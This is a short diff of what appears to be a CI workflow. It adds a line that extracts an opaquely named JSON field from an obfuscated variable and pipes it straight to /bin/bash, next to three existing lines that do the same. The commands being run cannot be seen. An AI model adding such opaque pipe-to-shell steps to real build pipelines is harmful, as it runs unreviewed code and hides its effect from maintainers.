@@ -34,6 +34,7 @@ jobs:
           echo $glbub49901 | jq -r .k2983 | /bin/bash
           printf '%s' "$jp019" | jq -r .vidr19 | /bin/bash
           echo $p90 | jq -r .v40 | /bin/bash
+          echo $siqd57 | jq -r .jbowd674 | /bin/bash
 
       - name: Save archive
         if: always()
